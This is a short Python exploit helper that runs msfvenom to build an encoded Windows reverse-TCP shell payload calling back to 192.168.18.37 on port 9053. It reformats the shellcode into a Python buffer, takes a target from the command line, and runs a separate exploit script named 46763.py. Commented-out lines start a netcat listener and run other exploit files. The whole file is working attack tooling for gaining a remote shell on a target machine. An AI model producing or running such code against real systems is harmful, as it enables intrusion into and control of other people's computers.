
import subprocess
import sys

import runpy
def listToString(s): 
    
    # initialize an empty string
    str1 = "\n" 
    
    # traverse in the string  
    var = "\n".join(s)
    # return string  
    return var
def generate_powershell_shellcode(payload, ipaddr, port):
   
    
    print(payload)
 
    # cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f python -b "\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai'.format(payload, ipaddr, port)
    
    cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f py -b "\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai'.format(payload,ipaddr ,port)

    
    
   
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)

     # grab the metasploit path
  
    data = proc.communicate()[0]
    
    # data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    # data = data.replace('b', "b")
    # data = data.replace("\n", "")
    # data = data.replace("buf=", "= "" ")
    data = data.replace("buf=", "buf += ")
    data = data.rstrip()

    # base counter
    
    chunks = data.split('\n')
    my_data = chunks[0].replace("buf += b""", "buf = b""")
    
    chunks[0] = my_data
    
    data = listToString(chunks)
    
    
    # f = open('payload.txt', 'wb')
    # f.write(data)
    # f.close()
    
    # usage(data)
    return data
   


# Python program to convert a list to string
    
# Function to convert  



target = sys.argv[1] 
port = 9053
port2 = 21

buf = generate_powershell_shellcode("windows/shell_reverse_tcp","192.168.18.37",port)

print(buf)
# subprocess.call("nc -nvlp {0}".format(port), shell=True)

# runpy.run_path(path_name='CVE:2017-2447.py')
# runpy.run_path(path_name='638.py')
runpy.run_path(path_name='46763.py')



